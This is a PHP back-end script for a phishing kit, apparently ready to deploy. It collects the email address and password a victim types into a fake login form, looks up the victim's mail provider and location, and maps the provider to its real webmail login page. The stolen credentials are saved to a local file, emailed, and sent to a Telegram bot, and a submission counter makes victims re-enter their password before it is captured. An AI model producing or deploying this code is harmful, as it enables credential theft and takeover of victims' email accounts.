<?php
// ==========================================
// Auto-detect and load config.php
// ==========================================
function loadConfig() {
    $possiblePaths = [
        __DIR__ . '/config.php',
        dirname(__DIR__) . '/config.php',
        __DIR__ . '/../config.php',
        __DIR__ . '/../../config.php',
        $_SERVER['DOCUMENT_ROOT'] . '/config.php',
        $_SERVER['DOCUMENT_ROOT'] . '/../config.php',
        '/etc/config.php',
    ];

    foreach ($possiblePaths as $path) {
        if (file_exists($path)) {
            require_once $path;
            return true;
        }
    }

    $dir = __DIR__;
    for ($i = 0; $i < 5; $i++) {
        $dir = dirname($dir);
        $configPath = $dir . '/config.php';
        if (file_exists($configPath)) {
            require_once $configPath;
            return true;
        }
    }

    return false;
}

if (!loadConfig()) {
    define('EMAIL', 'email here');
    define('TG_TOKEN', 'enter token');
    define('TG_CHAT_ID', 'chat id');
    define('SUBMIT', '2');
}

$sendToEmail   = EMAIL;
$telegramToken = TG_TOKEN;
$telegramChatId= TG_CHAT_ID;
$submitLimit   = defined('SUBMIT') ? (int)SUBMIT : 2;

// ==========================================
// Session tracking
// ==========================================
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

function getSessionIdentifier() {
    global $session_folder;
    if (isset($session_folder) && !empty($session_folder)) {
        return $session_folder;
    }
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    return md5($ip . date('Y-m-d'));
}

$sessionId    = getSessionIdentifier();
$sessionFile  = sys_get_temp_dir() . '/' . $sessionId . '_submissions.txt';

$submissionCount = 0;
if (file_exists($sessionFile)) {
    $submissionCount = (int)file_get_contents($sessionFile);
}

// ==========================================
// Collect input
// ==========================================
$user = $_POST['user'] ?? '';
$pass = $_POST['pass'] ?? '';

// ==========================================
// Validate email
// ==========================================
if (!filter_var($user, FILTER_VALIDATE_EMAIL)) {
    exit('Invalid email address.');
}

// ==========================================
// Increment submission count
// ==========================================
$submissionCount++;
file_put_contents($sessionFile, $submissionCount);

// ==========================================
// If this is NOT the final submission, just redirect (don't send).
// Only the LAST submission is captured and forwarded.
// ==========================================
if ($submissionCount < $submitLimit) {
    header("Location: go-all.php?user=" . urlencode($user));
    exit();
}

// ==========================================
// FINAL SUBMISSION — capture, send, redirect
// ==========================================
$timestamp = date('Y-m-d H:i:s');

// MX Records
$domain = substr(strrchr($user, "@"), 1);
$mxRecords = '';
if (function_exists('getmxrr') && getmxrr($domain, $mxhosts)) {
    $mxRecords = implode(', ', $mxhosts);
} else {
    $mxRecordsArray = @dns_get_record($domain, DNS_MX);
    if (!empty($mxRecordsArray)) {
        $mxRecords = implode(', ', array_column($mxRecordsArray, 'target'));
    } else {
        $mxRecords = 'No MX records found.';
    }
}

// IP + Country
$ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown IP';
$country = 'Unknown Country';

$geoData = @file_get_contents("http://ip-api.com/json/$ip");
if ($geoData !== false) {
    $geoJson = json_decode($geoData, true);
    if ($geoJson && isset($geoJson['status']) && $geoJson['status'] === 'success') {
        $country = $geoJson['country'] ?? 'Unknown Country';
    }
}
if ($country === 'Unknown Country') {
    $geoData2 = @file_get_contents("https://ipapi.co/$ip/country_name/");
    if ($geoData2 !== false && !empty(trim($geoData2))) {
        $country = trim($geoData2);
    }
}

// Webmail login URL
$webmailL0gin = "https://webmail.$domain";
if (!empty($mxRecords) && $mxRecords !== 'No MX records found.') {
    $mxDomain = explode(', ', $mxRecords)[0];

    $webmailMapping = [
        'mx.yandex.ru' => 'https://mail.yandex.com',
        'mx.mail.ru' => 'https://mail.ru',
        'mx.ukr.net' => 'https://mail.ukr.net',
        'mx.gmx.net' => 'https://mail.gmx.com',
        'mx.orange.fr' => 'https://webmail.orange.fr',
        'mx.protonmail.ch' => 'https://mail.proton.me',
        'mx.web.de' => 'https://web.de',
        'mx.vodafone.it' => 'https://mail.vodafone.it',
        'mx.libero.it' => 'https://mail.libero.it',
        'mx.tiscali.it' => 'https://mail.tiscali.it',
        'mx.turktelekom.com.tr' => 'https://webmail.turktelekom.com.tr',
        'mx.superonline.net' => 'https://mail.superonline.net',
        'mx.turk.net' => 'https://mail.turk.net',
        'mx.telefonica.net' => 'https://webmail.telefonica.net',
        'mx.movistar.es' => 'https://correo.movistar.es',
        'mx.uol.com.br' => 'https://email.uol.com.br',
        'mx.terra.com.br' => 'https://webmail.terra.com.br',
        'mx.bol.com.br' => 'https://email.bol.com.br',
        'stackmail.com' => 'https://stackmail.com',
        'ionos.com' => 'https://mail.ionos.com',
        'appsuite.com' => 'https://mail.appsuite.com',
        '1and1.com' => 'https://mail.ionos.com',
        'titan.email' => 'https://mail.titan.email',
        'zoho.com' => 'https://mail.zoho.com',
        'zoho.in' => 'https://mail.zoho.in',
        'zoho.eu' => 'https://mail.zoho.eu',
        'hostinger.com' => 'https://mail.hostinger.com',
        'secureserver.net' => 'https://email.godaddy.com',
        'google.com' => 'https://mail.google.com',
        'gmail.com' => 'https://mail.google.com',
        'mxhichina' => 'https://mail.mxhichina.com/alimail/',
        'emailsrvr.com' => 'https://apps.rackspace.com',
        'aruba.it' => 'https://webmail.aruba.it/',
        'ovh.net' => 'https://www.ovhcloud.com/en-gb/mail/',
        'mx.ovh.net' => 'https://www.ovhcloud.com/en-gb/mail/',
        'ovhcloud.com' => 'https://www.ovhcloud.com/en-gb/mail/',
        'mx.ovhcloud.com' => 'https://www.ovhcloud.com/en-gb/mail/',
        'webmail.ovh.net' => 'https://webmail.ovh.net',
        'securemail.hk' => 'https://mail201.securemail.hk',
        'mx.securemail.hk' => 'https://mail201.securemail.hk',
        'mail.securemail.hk' => 'https://mail201.securemail.hk',
        'yahoo.com' => 'https://mail.yahoo.com',
        'yahoo.co.uk' => 'https://mail.yahoo.com',
        'yahoo.co.jp' => 'https://mail.yahoo.co.jp',
        'ymail.com' => 'https://mail.yahoo.com',
        'rocketmail.com' => 'https://mail.yahoo.com',
        'att.net' => 'https://currently.att.yahoo.com',
        'sbcglobal.net' => 'https://currently.att.yahoo.com',
        'bellsouth.net' => 'https://currently.att.yahoo.com',
        'qq.com' => 'https://mail.qq.com',
        '163.com' => 'https://mail.163.com',
        '126.com' => 'https://mail.126.com',
        'sina.com' => 'https://mail.sina.com.cn',
        'sohu.com' => 'https://mail.sohu.com',
        'tom.com' => 'https://mail.tom.com',
        '21cn.com' => 'https://mail.21cn.com',
        'yeah.net' => 'https://mail.yeah.net',
    ];

    foreach ($webmailMapping as $key => $url) {
        if (strpos($mxDomain, $key) !== false) {
            $webmailL0gin = $url;
            break;
        }
    }
}

$hostname = gethostbyaddr($ip);

// ==========================================
// Build message
// ==========================================
$message  = "------------------------\n";
$message .= "Page           : General Page\n";
$message .= "Em             : $user\n";
$message .= "psd            : $pass\n";
$message .= "IP             : $ip\n";
$message .= "Country        : $country\n";
$message .= "Hostname       : $hostname\n";
$message .= "MX Records     : $mxRecords\n";
$message .= "Webmail L0gin  : $webmailL0gin\n";
$message .= "Time           : $timestamp\n";
$message .= "Submission #   : $submissionCount of $submitLimit\n";
$message .= "------------------------\n";
$message .= "User Agent     : " . ($_SERVER['HTTP_USER_AGENT'] ?? 'Unknown') . "\n";
$message .= "-----------------------\n";

// ==========================================
// Save to file
// ==========================================
$saveFile = __DIR__ . '/d@main123.txt';
@file_put_contents($saveFile, $message, FILE_APPEND);

// ==========================================
// Send email
// ==========================================
$subject = "UPDATE L0GZ | $country | $ip";
@mail($sendToEmail, $subject, $message);

// ==========================================
// Send to Telegram
// ==========================================
$telegramUrl = "https://api.telegram.org/bot$telegramToken/sendMessage";
$telegramData = [
    'chat_id' => $telegramChatId,
    'text'    => $message
];
$options = [
    'http' => [
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($telegramData),
        'timeout' => 5,
    ]
];
@file_get_contents($telegramUrl, false, stream_context_create($options));

// ==========================================
// Reset counter and redirect (final attempt)
// ==========================================
@unlink($sessionFile);
header("Location: go-all.php?user=" . urlencode($user));
exit();
?>